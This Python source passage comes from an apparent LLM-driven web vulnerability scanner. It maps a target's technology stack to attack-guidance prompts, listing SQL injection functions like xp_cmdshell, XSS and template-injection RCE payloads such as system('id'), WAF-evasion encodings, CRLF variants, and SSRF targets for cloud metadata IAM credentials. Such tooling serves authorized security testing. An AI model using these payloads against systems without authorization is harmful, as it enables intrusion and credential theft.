"""
TechContextMixin - Context-Aware Technology Stack Integration for Specialist Agents.

Provides reusable methods for:
1. Loading technology profiles from recon data
2. Normalizing stack info into actionable database/server/language context
3. Generating context-aware "Prime Directive" prompts for LLM calls

Usage:
    class SQLiAgent(BaseAgent, TechContextMixin):
        async def run_loop(self):
            self.tech_stack = self.load_tech_stack(self.report_dir)
            self.prime_directive = self.generate_context_prompt(self.tech_stack)

Author: BugTraceAI Team
Date: 2026-02-03
Version: 1.0.0
"""

import json
from pathlib import Path
from typing import Dict, List, Optional

from bugtrace.utils.logger import get_logger

logger = get_logger("tech_context_mixin")


# =============================================================================
# DATABASE INFERENCE RULES
# =============================================================================

# Framework → Likely Database mapping
FRAMEWORK_TO_DB = {
    # PHP ecosystem
    "php": "MySQL",
    "laravel": "MySQL",
    "symfony": "MySQL",
    "wordpress": "MySQL",
    "drupal": "MySQL",
    "joomla": "MySQL",
    "codeigniter": "MySQL",
    "yii": "MySQL",
    "cakephp": "MySQL",

    # Python ecosystem
    "django": "PostgreSQL",
    "flask": "PostgreSQL",
    "fastapi": "PostgreSQL",

    # Java ecosystem
    "spring": "PostgreSQL",
    "struts": "Oracle",
    "hibernate": "PostgreSQL",

    # .NET ecosystem
    "asp.net": "MSSQL",
    ".net": "MSSQL",
    "dotnet": "MSSQL",

    # Ruby ecosystem
    "rails": "PostgreSQL",
    "ruby on rails": "PostgreSQL",
    "sinatra": "PostgreSQL",

    # Node.js ecosystem
    "express": "MongoDB",  # Often NoSQL but can vary
    "nextjs": "PostgreSQL",
    "nestjs": "PostgreSQL",

    # CMS
    "magento": "MySQL",
    "prestashop": "MySQL",
    "opencart": "MySQL",
}

# Server → Likely Language mapping
SERVER_TO_LANG = {
    "apache": "PHP",
    "nginx": "varies",  # Need framework hint
    "iis": "ASP.NET",
    "tomcat": "Java",
    "jetty": "Java",
    "gunicorn": "Python",
    "uvicorn": "Python",
    "puma": "Ruby",
    "unicorn": "Ruby",
}

# Tech tags that hint at database types
TAG_TO_DB = {
    "mysql": "MySQL",
    "mariadb": "MySQL",
    "postgresql": "PostgreSQL",
    "postgres": "PostgreSQL",
    "mssql": "MSSQL",
    "sqlserver": "MSSQL",
    "oracle": "Oracle",
    "sqlite": "SQLite",
    "mongodb": "MongoDB",
    "redis": "Redis",
}


class TechContextMixin:
    """
    Mixin that provides context-aware technology stack loading for specialist agents.

    Designed to be mixed into BaseAgent subclasses to provide:
    - Technology profile loading from recon data
    - Database/server/language inference
    - Context-aware prompt generation for LLM calls
    """

    def load_tech_stack(self, report_dir: Path) -> Dict:
        """
        Load and synthesize tech stack from recon report.

        Args:
            report_dir: Path to scan report directory

        Returns:
            Normalized stack dict: {"db": "MySQL", "server": "nginx", "lang": "PHP"}
        """
        default_stack = {
            "db": "generic",
            "server": "generic",
            "lang": "generic",
            "frameworks": [],
            "waf": None,
            "cdn": None,
            "raw_profile": {}
        }

        # Load raw tech profile
        tech_profile = self._load_raw_tech_profile(report_dir)

        if not tech_profile:
            logger.debug("No tech profile found, using generic stack")
            return default_stack

        # Normalize into actionable context
        return self._normalize_stack(tech_profile)

    def _load_raw_tech_profile(self, report_dir: Path) -> Optional[Dict]:
        """Load raw tech_profile.json from recon directory."""
        if not report_dir:
            return None

        # Try multiple possible locations
        possible_paths = [
            report_dir / "recon" / "tech_profile.json",
            report_dir / "tech_profile.json",
            report_dir / "recon" / "technologies.json",
        ]

        for tech_file in possible_paths:
            if tech_file.exists():
                try:
                    with open(tech_file, 'r') as f:
                        data = json.load(f)
                        logger.info(f"Loaded tech profile from: {tech_file}")
                        return data
                except Exception as e:
                    logger.error(f"Failed to parse tech profile {tech_file}: {e}")
                    continue

        return None

    def _normalize_stack(self, raw_profile: Dict) -> Dict:
        """
        Normalize raw tech profile into actionable SQL injection context.

        Inference chain:
        1. Direct database detection (if present in tech_tags)
        2. Framework → Database inference
        3. Server → Language inference
        4. Fallback to generic
        """
        stack = {
            "db": "generic",
            "server": "generic",
            "lang": "generic",
            "frameworks": raw_profile.get("frameworks", []),
            "waf": self._extract_first(raw_profile.get("waf", [])),
            "cdn": self._extract_first(raw_profile.get("cdn", [])),
            "raw_profile": raw_profile
        }

        tech_tags = [t.lower() for t in raw_profile.get("tech_tags", [])]
        frameworks = [f.lower() for f in raw_profile.get("frameworks", [])]
        servers = [s.lower() for s in raw_profile.get("servers", [])]
        languages = [l.lower() for l in raw_profile.get("languages", [])]
        infrastructure = [i.lower() for i in raw_profile.get("infrastructure", [])]

        # 1. Direct database detection from tech tags
        for tag in tech_tags + infrastructure:
            tag_lower = tag.lower()
            for db_hint, db_type in TAG_TO_DB.items():
                if db_hint in tag_lower:
                    stack["db"] = db_type
                    logger.debug(f"Database detected from tag '{tag}': {db_type}")
                    break
            if stack["db"] != "generic":
                break

        # 2. Framework → Database inference (if no direct detection)
        if stack["db"] == "generic":
            for framework in frameworks:
                framework_lower = framework.lower()
                for fw_hint, db_type in FRAMEWORK_TO_DB.items():
                    if fw_hint in framework_lower:
                        stack["db"] = db_type
                        logger.debug(f"Database inferred from framework '{framework}': {db_type}")
                        break
                if stack["db"] != "generic":
                    break

        # 3. Server detection
        for server in servers:
            server_lower = server.lower()
            for srv_hint in ["apache", "nginx", "iis", "tomcat", "jetty", "gunicorn", "uvicorn"]:
                if srv_hint in server_lower:
                    stack["server"] = srv_hint.title()
                    break
            if stack["server"] != "generic":
                break

        # 4. Language detection
        if languages:
            stack["lang"] = languages[0].title()
        elif stack["server"] != "generic":
            # Infer from server
            server_lower = stack["server"].lower()
            if server_lower in SERVER_TO_LANG:
                inferred_lang = SERVER_TO_LANG[server_lower]
                if inferred_lang != "varies":
                    stack["lang"] = inferred_lang

        # 5. Framework → Language fallback
        if stack["lang"] == "generic" and frameworks:
            for framework in frameworks:
                fw_lower = framework.lower()
                if any(x in fw_lower for x in ["php", "laravel", "symfony", "wordpress"]):
                    stack["lang"] = "PHP"
                    break
                elif any(x in fw_lower for x in ["django", "flask", "fastapi"]):
                    stack["lang"] = "Python"
                    break
                elif any(x in fw_lower for x in ["spring", "struts", "hibernate", "java"]):
                    stack["lang"] = "Java"
                    break
                elif any(x in fw_lower for x in ["asp.net", ".net", "razor"]):
                    stack["lang"] = "ASP.NET"
                    break
                elif any(x in fw_lower for x in ["rails", "ruby"]):
                    stack["lang"] = "Ruby"
                    break
                elif any(x in fw_lower for x in ["express", "next", "node"]):
                    stack["lang"] = "Node.js"
                    break

        logger.info(f"Normalized tech stack: db={stack['db']}, server={stack['server']}, lang={stack['lang']}")
        return stack

    def _extract_first(self, items: List) -> Optional[str]:
        """Extract first item from list or return None."""
        return items[0] if items else None

    def generate_context_prompt(self, stack: Dict) -> str:
        """
        Generate the 'Prime Directive' context block for LLM prompts.

        This context helps the LLM focus on relevant payloads and techniques
        based on the detected technology stack.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted prompt section to inject into system prompts
        """
        db = stack.get("db", "Unknown")
        server = stack.get("server", "Unknown")
        lang = stack.get("lang", "Unknown")
        waf = stack.get("waf")
        frameworks = stack.get("frameworks", [])

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK",
            f"- Database: {db}",
            f"- Web Server: {server}",
            f"- Language/Framework: {lang}",
        ]

        if frameworks:
            prompt_parts.append(f"- Frameworks: {', '.join(frameworks[:3])}")

        if waf:
            prompt_parts.append(f"- WAF Detected: {waf}")

        # Strategic implications based on detected stack
        prompt_parts.append("")
        prompt_parts.append("## STRATEGIC IMPLICATIONS")

        # Database-specific guidance
        if db != "generic" and db != "Unknown":
            prompt_parts.append(f"- Focus ONLY on payloads compatible with {db}.")
            prompt_parts.append(f"- Use {db}-specific syntax for injection attempts.")

            if db == "MySQL":
                prompt_parts.append("- MySQL: Use CONCAT(), LOAD_FILE(), comment variations (-- , #, /**/)")
            elif db == "PostgreSQL":
                prompt_parts.append("- PostgreSQL: Use string_agg(), ||, pg_sleep(), $$ quoting")
            elif db == "MSSQL":
                prompt_parts.append("- MSSQL: Use WAITFOR DELAY, xp_cmdshell, CONVERT(), stacked queries")
            elif db == "Oracle":
                prompt_parts.append("- Oracle: Use UTL_HTTP, DBMS_PIPE, TO_CHAR(), dual table")
            elif db == "SQLite":
                prompt_parts.append("- SQLite: Use sqlite_version(), load_extension(), simple syntax")
        else:
            prompt_parts.append("- Database type unknown: test multi-database payloads")

        # Language-specific guidance
        if lang != "generic" and lang != "Unknown":
            prompt_parts.append(f"- Identify parameter patterns common in {lang} applications.")

            if lang == "PHP":
                prompt_parts.append("- PHP: Watch for magic_quotes bypass, mysql_real_escape_string issues")
            elif lang == "ASP.NET":
                prompt_parts.append("- ASP.NET: Consider parameterized query bypasses, ViewState")
            elif lang == "Java":
                prompt_parts.append("- Java: Look for PreparedStatement misuse, Hibernate HQL injection")

        # WAF considerations
        if waf:
            prompt_parts.append(f"- WAF PRESENT ({waf}): Use evasion techniques - encoding, case mixing, comments")

        return "\n".join(prompt_parts)

    def generate_dedup_context(self, stack: Dict) -> str:
        """
        Generate context specifically for WET→DRY deduplication prompts.

        Helps LLM understand which findings are truly duplicates based on
        the technology stack.

        Args:
            stack: Normalized tech stack

        Returns:
            Deduplication-focused context string
        """
        db = stack.get("db", "generic")
        lang = stack.get("lang", "generic")

        context_parts = [
            "## TECHNOLOGY CONTEXT FOR DEDUPLICATION",
            f"- Detected Database: {db}",
            f"- Detected Language: {lang}",
            "",
            "## DEDUPLICATION RULES",
        ]

        # Database-specific dedup rules
        if db == "MySQL":
            context_parts.append("- MySQL: UNION SELECT column count must match; NULL padding varies by endpoint")
        elif db == "MSSQL":
            context_parts.append("- MSSQL: Stacked queries may work differently per stored procedure")
        elif db == "PostgreSQL":
            context_parts.append("- PostgreSQL: Dollar-quoting sensitivity varies by function context")

        # General rules
        context_parts.extend([
            "- Cookie-based SQLi: GLOBAL scope (same cookie = same vuln, different URLs = duplicates)",
            "- Header-based SQLi: GLOBAL scope (same header = same vuln)",
            f"- URL params: PER-ENDPOINT scope (different {lang} controllers = different vulnerabilities)",
            "- POST params: PER-ENDPOINT scope (different forms = different vulnerabilities)",
        ])

        return "\n".join(context_parts)

    # =========================================================================
    # XSS-SPECIFIC CONTEXT GENERATION
    # =========================================================================

    def generate_xss_context_prompt(self, stack: Dict) -> str:
        """
        Generate XSS-specific 'Prime Directive' context block for LLM prompts.

        This context helps the LLM focus on relevant XSS payloads and techniques
        based on the detected technology stack.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted XSS-focused prompt section
        """
        server = stack.get("server", "Unknown")
        lang = stack.get("lang", "Unknown")
        waf = stack.get("waf")
        frameworks = stack.get("frameworks", [])
        raw_profile = stack.get("raw_profile", {})

        # Detect frontend frameworks from tech tags
        tech_tags = [t.lower() for t in raw_profile.get("tech_tags", [])]
        frontend_frameworks = self._detect_frontend_frameworks(frameworks, tech_tags)

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (XSS CONTEXT)",
            f"- Web Server: {server}",
            f"- Backend Language: {lang}",
        ]

        if frontend_frameworks:
            prompt_parts.append(f"- Frontend Frameworks: {', '.join(frontend_frameworks)}")

        if frameworks:
            prompt_parts.append(f"- Backend Frameworks: {', '.join(frameworks[:3])}")

        if waf:
            prompt_parts.append(f"- WAF Detected: {waf}")

        # Strategic implications based on detected stack
        prompt_parts.append("")
        prompt_parts.append("## XSS STRATEGIC IMPLICATIONS")

        # Frontend framework-specific guidance
        if "react" in frontend_frameworks:
            prompt_parts.extend([
                "- React detected: dangerouslySetInnerHTML is primary vector",
                "- React: Focus on server-side rendering (SSR) XSS if Next.js detected",
                "- React: Look for DOM-based XSS via useRef, getElementById patterns",
            ])
        if "angular" in frontend_frameworks:
            prompt_parts.extend([
                "- Angular detected: bypassSecurityTrust* functions are key vectors",
                "- Angular: Template injection via {{ }} interpolation (CSTI overlap)",
                "- Angular: Look for [innerHTML] binding misuse",
            ])
        if "vue" in frontend_frameworks:
            prompt_parts.extend([
                "- Vue detected: v-html directive is primary vector",
                "- Vue: Template injection via {{ }} interpolation",
                "- Vue: Look for :href and @click event handler injection",
            ])

        # Backend-specific XSS guidance
        if lang != "generic" and lang != "Unknown":
            prompt_parts.append(f"- Backend ({lang}): Check for improper output encoding")

            if lang == "PHP":
                prompt_parts.extend([
                    "- PHP: Look for echo/print without htmlspecialchars()",
                    "- PHP: WordPress has many unescaped shortcode patterns",
                ])
            elif lang == "Python":
                prompt_parts.extend([
                    "- Python: Jinja2 |safe filter, mark_safe() are vectors",
                    "- Python: Django autoescape may be disabled in templates",
                ])
            elif lang == "Node.js":
                prompt_parts.extend([
                    "- Node.js: EJS <%- %> unescaped output, Pug != operator",
                    "- Node.js: Express res.send() without encoding",
                ])
            elif lang == "Java":
                prompt_parts.extend([
                    "- Java: JSP scriptlets, EL expressions ${} are vectors",
                    "- Java: Spring Thymeleaf th:utext for unescaped output",
                ])
            elif lang == "ASP.NET":
                prompt_parts.extend([
                    "- ASP.NET: @Html.Raw(), Response.Write() without encoding",
                    "- ASP.NET: Razor <%: %> vs <%= %> (unescaped)",
                ])

        # WAF evasion strategies
        if waf:
            prompt_parts.extend([
                f"- WAF PRESENT ({waf}): Apply evasion techniques:",
                "  * Case variation: <ScRiPt>, <IMG SRC=x>",
                "  * Event handlers: onfocus, onmouseover (avoid onclick)",
                "  * Encoding: HTML entities, Unicode, double-encoding",
                "  * Tag alternatives: <svg>, <math>, <details>",
                "  * Payloads without spaces: <svg/onload=alert(1)>",
            ])
        else:
            prompt_parts.append("- No WAF detected: Standard payloads likely effective")

        return "\n".join(prompt_parts)

    def generate_xss_dedup_context(self, stack: Dict) -> str:
        """
        Generate XSS-specific context for WET→DRY deduplication prompts.

        XSS deduplication must consider:
        - Injection context (HTML body, attribute, JavaScript, URL)
        - Same parameter in different contexts = DIFFERENT vulnerabilities
        - Same parameter with same context = DUPLICATE

        Args:
            stack: Normalized tech stack

        Returns:
            XSS deduplication-focused context string
        """
        lang = stack.get("lang", "generic")
        waf = stack.get("waf")
        frameworks = stack.get("frameworks", [])

        context_parts = [
            "## TECHNOLOGY CONTEXT FOR XSS DEDUPLICATION",
            f"- Detected Backend: {lang}",
            f"- WAF Present: {'Yes - ' + waf if waf else 'No'}",
            "",
            "## XSS DEDUPLICATION RULES",
            "",
            "### Context-Based Deduplication (CRITICAL)",
            "XSS findings are DIFFERENT if injection context differs, even for same URL+param:",
            "- HTML Body context: <div>PAYLOAD</div>",
            "- HTML Attribute context: <input value=\"PAYLOAD\">",
            "- JavaScript String context: var x = 'PAYLOAD';",
            "- JavaScript Template context: `${PAYLOAD}`",
            "- URL/href context: <a href=\"PAYLOAD\">",
            "- CSS context: style=\"background:url(PAYLOAD)\"",
            "",
            "### Scope Rules",
            "- Reflected XSS: PER-ENDPOINT scope (same param on different pages = DIFFERENT)",
            "- DOM XSS: PER-PAGE scope (different DOM sinks = DIFFERENT)",
            "- Stored XSS: GLOBAL scope (same storage location = DUPLICATE)",
            "",
            "### Examples",
            "- param 'q' @ /search (HTML body) ≠ param 'q' @ /search (JS context) → DIFFERENT",
            "- param 'id' @ /page?id=1 = param 'id' @ /page?id=2 (same context) → DUPLICATE",
            "- param 'name' @ /profile ≠ param 'name' @ /settings → DIFFERENT endpoints",
        ]

        # Framework-specific dedup notes
        if any("angular" in f.lower() for f in frameworks):
            context_parts.append("- Angular: Template injection and DOM XSS are DIFFERENT vuln types")
        if any("react" in f.lower() for f in frameworks):
            context_parts.append("- React: SSR XSS vs DOM XSS are DIFFERENT vulnerability classes")

        return "\n".join(context_parts)

    def _detect_frontend_frameworks(self, frameworks: List[str], tech_tags: List[str]) -> List[str]:
        """Detect frontend JavaScript frameworks from tech profile."""
        detected = []
        all_hints = [f.lower() for f in frameworks] + tech_tags

        frontend_hints = {
            "react": ["react", "reactjs", "next.js", "nextjs", "gatsby"],
            "angular": ["angular", "angularjs"],
            "vue": ["vue", "vuejs", "vue.js", "nuxt"],
            "jquery": ["jquery"],
            "svelte": ["svelte", "sveltekit"],
            "ember": ["ember", "emberjs"],
        }

        for framework, hints in frontend_hints.items():
            if any(hint in " ".join(all_hints) for hint in hints):
                detected.append(framework)

        return detected

    # =========================================================================
    # CSTI/SSTI-SPECIFIC CONTEXT GENERATION
    # =========================================================================

    def generate_csti_context_prompt(self, stack: Dict) -> str:
        """
        Generate CSTI/SSTI-specific 'Prime Directive' context block for LLM prompts.

        This context helps the LLM focus on relevant template injection payloads
        based on the detected technology stack.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted CSTI-focused prompt section
        """
        lang = stack.get("lang", "Unknown")
        frameworks = stack.get("frameworks", [])
        waf = stack.get("waf")
        raw_profile = stack.get("raw_profile", {})

        # Detect template engines from tech profile
        tech_tags = [t.lower() for t in raw_profile.get("tech_tags", [])]
        detected_engines = self._detect_template_engines(frameworks, tech_tags, lang)

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (CSTI/SSTI CONTEXT)",
            f"- Backend Language: {lang}",
        ]

        if detected_engines:
            prompt_parts.append(f"- Detected Template Engines: {', '.join(detected_engines)}")

        if frameworks:
            prompt_parts.append(f"- Frameworks: {', '.join(frameworks[:3])}")

        if waf:
            prompt_parts.append(f"- WAF Detected: {waf}")

        # Strategic implications
        prompt_parts.append("")
        prompt_parts.append("## CSTI/SSTI STRATEGIC IMPLICATIONS")

        # Engine-specific guidance
        if "jinja2" in detected_engines or lang == "Python":
            prompt_parts.extend([
                "- Jinja2 (Python): {{ config }}, {{ self.__class__.__mro__ }}",
                "- Jinja2: RCE via __subclasses__(), __globals__, __builtins__",
                "- Jinja2: Test with {{7*7}}, {{config.items()}}, {{request.application}}",
            ])
        if "twig" in detected_engines or lang == "PHP":
            prompt_parts.extend([
                "- Twig (PHP): {{_self.env.registerUndefinedFilterCallback('exec')}}",
                "- Twig: Test with {{7*7}}, {{app.request.server.all|join(',')}}",
                "- Twig: RCE via filter() function abuse",
            ])
        if "freemarker" in detected_engines or lang == "Java":
            prompt_parts.extend([
                "- FreeMarker (Java): <#assign ex=\"freemarker.template.utility.Execute\"?new()>",
                "- FreeMarker: Test with ${7*7}, ${.now}, ${product.class.protectionDomain}",
                "- Velocity: #set($x=7*7)$x, $class.inspect(\"java.lang.Runtime\")",
            ])
        if "erb" in detected_engines or lang == "Ruby":
            prompt_parts.extend([
                "- ERB (Ruby): <%= 7*7 %>, <%= system('id') %>",
                "- Slim/Haml: Test with = 7*7, = `id`",
                "- ERB: Code execution via backticks or system()",
            ])
        if "razor" in detected_engines or lang == "ASP.NET":
            prompt_parts.extend([
                "- Razor (ASP.NET): @(7*7), @Html.Raw(code)",
                "- Razor: Limited SSTI surface, focus on deserialization chains",
            ])
        if "ejs" in detected_engines or lang == "Node.js":
            prompt_parts.extend([
                "- EJS (Node.js): <%- include('file') %>, <%= 7*7 %>",
                "- Pug/Jade: #{7*7}, !{userInput}",
                "- EJS: RCE via include with file traversal",
            ])

        # Client-side template injection (CSTI)
        frontend_frameworks = self._detect_frontend_frameworks(frameworks, tech_tags)
        if "angular" in frontend_frameworks:
            prompt_parts.extend([
                "",
                "## CLIENT-SIDE TEMPLATE INJECTION (CSTI)",
                "- AngularJS detected: {{constructor.constructor('alert(1)')()}}",
                "- Angular: Sandbox escapes for versions < 1.6",
                "- Angular: Test with {{7*7}}, {{$on.constructor('alert(1)')()}}",
            ])
        if "vue" in frontend_frameworks:
            prompt_parts.extend([
                "",
                "## CLIENT-SIDE TEMPLATE INJECTION (CSTI)",
                "- Vue.js detected: {{_c.constructor('alert(1)')()}}",
                "- Vue: v-html directive enables XSS, not CSTI",
                "- Vue: Test with {{7*7}}, {{constructor.constructor('alert(1)')()}}",
            ])

        # WAF evasion
        if waf:
            prompt_parts.extend([
                "",
                f"## WAF EVASION ({waf})",
                "- Use string concatenation: {{'con'+'fig'}}",
                "- Use alternative syntax: {% raw %}...{% endraw %}",
                "- Encoding: Unicode escapes, hex encoding",
                "- Comment injection: {{7*{#comment#}7}}",
            ])

        return "\n".join(prompt_parts)

    def generate_csti_dedup_context(self, stack: Dict) -> str:
        """
        Generate CSTI-specific context for WET→DRY deduplication prompts.

        CSTI deduplication must consider:
        - Template engine type (Jinja2 ≠ Twig ≠ Angular)
        - Client-side vs Server-side (CSTI vs SSTI)
        - Same engine + same parameter = DUPLICATE

        Args:
            stack: Normalized tech stack

        Returns:
            CSTI deduplication-focused context string
        """
        lang = stack.get("lang", "generic")
        frameworks = stack.get("frameworks", [])
        raw_profile = stack.get("raw_profile", {})

        tech_tags = [t.lower() for t in raw_profile.get("tech_tags", [])]
        detected_engines = self._detect_template_engines(frameworks, tech_tags, lang)
        frontend_frameworks = self._detect_frontend_frameworks(frameworks, tech_tags)

        context_parts = [
            "## TECHNOLOGY CONTEXT FOR CSTI DEDUPLICATION",
            f"- Detected Backend: {lang}",
            f"- Detected Engines: {', '.join(detected_engines) if detected_engines else 'Unknown'}",
            f"- Frontend Frameworks: {', '.join(frontend_frameworks) if frontend_frameworks else 'None'}",
            "",
            "## CSTI DEDUPLICATION RULES",
            "",
            "### Engine-Based Deduplication (CRITICAL)",
            "CSTI findings are DIFFERENT if template engine differs:",
            "- Jinja2 (Python) ≠ Twig (PHP) ≠ FreeMarker (Java) ≠ ERB (Ruby)",
            "- Angular (CSTI/client) ≠ Jinja2 (SSTI/server)",
            "- Vue (CSTI/client) ≠ Twig (SSTI/server)",
            "",
            "### Scope Rules",
            "- Same URL + param + engine → DUPLICATE (keep one)",
            "- Same URL + param + DIFFERENT engine → DIFFERENT (keep both)",
            "- Different endpoints → DIFFERENT (keep both)",
            "- Client-side vs Server-side → DIFFERENT vulnerability classes",
            "",
            "### Examples",
            "- /page?name=X (Jinja2) = /page?name=Y (Jinja2) → DUPLICATE",
            "- /page?name=X (Jinja2) ≠ /page?name=Y (Twig) → DIFFERENT engines",
            "- /page?name=X (Angular) ≠ /page?name=Y (Jinja2) → CSTI vs SSTI",
            "- /page?name=X ≠ /other?name=Y → DIFFERENT endpoints",
        ]

        # Add detected engine notes
        if detected_engines:
            context_parts.append("")
            context_parts.append(f"### Priority Engines (from tech profile): {', '.join(detected_engines)}")
            context_parts.append("- Prioritize payloads for these detected engines")

        return "\n".join(context_parts)

    def _detect_template_engines(self, frameworks: List[str], tech_tags: List[str], lang: str) -> List[str]:
        """Detect likely template engines from tech profile and language."""
        detected = []
        all_hints = [f.lower() for f in frameworks] + tech_tags

        # Direct template engine detection
        engine_hints = {
            "jinja2": ["jinja", "jinja2", "flask", "django"],
            "twig": ["twig", "symfony"],
            "freemarker": ["freemarker", "spring"],
            "velocity": ["velocity"],
            "thymeleaf": ["thymeleaf", "spring"],
            "erb": ["erb", "rails", "ruby on rails"],
            "slim": ["slim"],
            "haml": ["haml"],
            "ejs": ["ejs", "express"],
            "pug": ["pug", "jade"],
            "handlebars": ["handlebars", "hbs"],
            "mustache": ["mustache"],
            "razor": ["razor", "asp.net", ".net"],
            "smarty": ["smarty", "php"],
            "mako": ["mako", "pylons"],
        }

        for engine, hints in engine_hints.items():
            if any(hint in " ".join(all_hints) for hint in hints):
                detected.append(engine)

        # Language-based inference if nothing detected
        if not detected:
            lang_to_engines = {
                "Python": ["jinja2"],
                "PHP": ["twig", "smarty"],
                "Java": ["freemarker", "velocity", "thymeleaf"],
                "Ruby": ["erb"],
                "Node.js": ["ejs", "pug"],
                "ASP.NET": ["razor"],
            }
            if lang in lang_to_engines:
                detected.extend(lang_to_engines[lang])

        return detected

    # =========================================================================
    # HEADER INJECTION-SPECIFIC CONTEXT GENERATION
    # =========================================================================

    def generate_header_injection_context_prompt(self, stack: Dict) -> str:
        """
        Generate Header Injection-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant header injection payloads
        based on the detected technology stack.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted Header Injection-focused prompt section
        """
        server = stack.get("server", "Unknown")
        lang = stack.get("lang", "Unknown")
        waf = stack.get("waf")
        cdn = stack.get("cdn")

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (HEADER INJECTION CONTEXT)",
            f"- Web Server: {server}",
            f"- Backend Language: {lang}",
        ]

        if cdn:
            prompt_parts.append(f"- CDN: {cdn}")
        if waf:
            prompt_parts.append(f"- WAF: {waf}")

        prompt_parts.append("")
        prompt_parts.append("## HEADER INJECTION STRATEGIC IMPLICATIONS")

        # Server-specific guidance
        server_lower = server.lower() if server else ""
        if "nginx" in server_lower:
            prompt_parts.extend([
                "- Nginx: Check for CRLF injection in Location header",
                "- Nginx: Test X-Forwarded-* header injection",
                "- Nginx: Proxy_pass URL manipulation via Host header",
            ])
        elif "apache" in server_lower:
            prompt_parts.extend([
                "- Apache: Check for CRLF injection in Location header",
                "- Apache: Test mod_proxy header injection",
                "- Apache: X-Forwarded-For chain manipulation",
            ])
        elif "iis" in server_lower:
            prompt_parts.extend([
                "- IIS: Check for Unicode CRLF variants (%u000d%u000a)",
                "- IIS: ARR proxy header manipulation",
            ])

        # CDN-specific guidance
        if cdn:
            prompt_parts.extend([
                f"- CDN ({cdn}): Cache poisoning via Host header",
                f"- CDN: X-Forwarded-Host manipulation for cache key",
                f"- CDN: Cache key injection via X-Original-URL",
            ])

        # WAF evasion
        if waf:
            prompt_parts.extend([
                f"- WAF PRESENT ({waf}): Use encoding bypasses",
                "  * Double encoding: %250d%250a",
                "  * Unicode variants: %E5%98%8A%E5%98%8D",
                "  * Null byte prefix: %00%0d%0a",
            ])

        return "\n".join(prompt_parts)

    def generate_header_injection_dedup_context(self, stack: Dict) -> str:
        """
        Generate Header Injection-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            Header Injection deduplication-focused context string
        """
        server = stack.get("server", "generic")
        cdn = stack.get("cdn")

        context_parts = [
            "## TECHNOLOGY CONTEXT FOR HEADER INJECTION DEDUPLICATION",
            f"- Detected Server: {server}",
            f"- CDN Present: {'Yes - ' + cdn if cdn else 'No'}",
            "",
            "## HEADER INJECTION DEDUPLICATION RULES",
            "",
            "### Header Type Deduplication",
            "- Same header type + same endpoint = DUPLICATE",
            "- Different header types (Host vs X-Forwarded-For) = DIFFERENT",
            "- Same header + different endpoints = DIFFERENT",
            "- Response header injection vs Request header = DIFFERENT classes",
            "",
            "### Scope Rules",
            "- CRLF in query params: PER-ENDPOINT scope",
            "- Host header injection: GLOBAL scope (affects all endpoints)",
            "- Cache poisoning: GLOBAL scope per cache key",
            "",
            "### Examples",
            "- CRLF in /search?q=X = CRLF in /search?q=Y → DUPLICATE",
            "- Host header @ /page1 = Host header @ /page2 → DUPLICATE (global)",
            "- X-Forwarded-For ≠ X-Forwarded-Host → DIFFERENT headers",
        ]

        return "\n".join(context_parts)

    # =========================================================================
    # SSRF-SPECIFIC CONTEXT GENERATION
    # =========================================================================

    def generate_ssrf_context_prompt(self, stack: Dict) -> str:
        """
        Generate SSRF-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant SSRF payloads
        based on the detected technology stack and cloud provider.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted SSRF-focused prompt section
        """
        infrastructure = stack.get("raw_profile", {}).get("infrastructure", [])
        lang = stack.get("lang", "Unknown")
        server = stack.get("server", "Unknown")

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (SSRF CONTEXT)",
            f"- Backend Language: {lang}",
            f"- Web Server: {server}",
        ]

        # Cloud detection
        cloud_providers = self._detect_cloud_provider(infrastructure)
        if cloud_providers:
            prompt_parts.append(f"- Cloud Provider: {', '.join(cloud_providers)}")

        prompt_parts.append("")
        prompt_parts.append("## SSRF STRATEGIC IMPLICATIONS")

        # Cloud-specific guidance
        if "aws" in cloud_providers:
            prompt_parts.extend([
                "- AWS detected: Target http://169.254.169.254/latest/meta-data/",
                "- AWS: IMDSv2 bypass via X-Forwarded-For header",
                "- AWS: Check for IAM role credentials at /iam/security-credentials/",
                "- AWS: ECS task metadata at http://169.254.170.2/",
            ])
        if "gcp" in cloud_providers:
            prompt_parts.extend([
                "- GCP detected: Target http://metadata.google.internal/",
                "- GCP: Use Metadata-Flavor: Google header",
                "- GCP: computeMetadata/v1/ for instance data",
            ])
        if "azure" in cloud_providers:
            prompt_parts.extend([
                "- Azure detected: Target http://169.254.169.254/metadata/",
                "- Azure: Use Metadata: true header",
                "- Azure: IMDS at /metadata/instance?api-version=2021-02-01",
            ])

        # No cloud detected - generic guidance
        if not cloud_providers:
            prompt_parts.extend([
                "- Test internal network: 127.0.0.1, localhost, 0.0.0.0",
                "- Test private ranges: 10.x.x.x, 172.16.x.x, 192.168.x.x",
                "- Test file:// protocol for local file access",
                "- Test DNS rebinding attacks",
            ])

        # Language-specific SSRF vectors
        if lang == "PHP":
            prompt_parts.append("- PHP: Test gopher://, dict://, expect:// wrappers")
        elif lang == "Python":
            prompt_parts.append("- Python: Test file://, dict://, gopher:// via urllib/requests")
        elif lang == "Java":
            prompt_parts.append("- Java: Test jar://, netdoc:// protocols")
        elif lang == "Node.js":
            prompt_parts.append("- Node.js: Test with node-fetch/axios URL handling quirks")

        return "\n".join(prompt_parts)

    def _detect_cloud_provider(self, infrastructure: List) -> List[str]:
        """Detect cloud providers from infrastructure tags."""
        detected = []
        infra_str = " ".join(str(i).lower() for i in infrastructure)

        if any(x in infra_str for x in ["aws", "amazon", "ec2", "s3", "alb", "elb", "cloudfront"]):
            detected.append("aws")
        if any(x in infra_str for x in ["gcp", "google", "gke", "cloud run", "gce", "app engine"]):
            detected.append("gcp")
        if any(x in infra_str for x in ["azure", "microsoft", "aks", "app service"]):
            detected.append("azure")

        return detected

    def generate_ssrf_dedup_context(self, stack: Dict) -> str:
        """
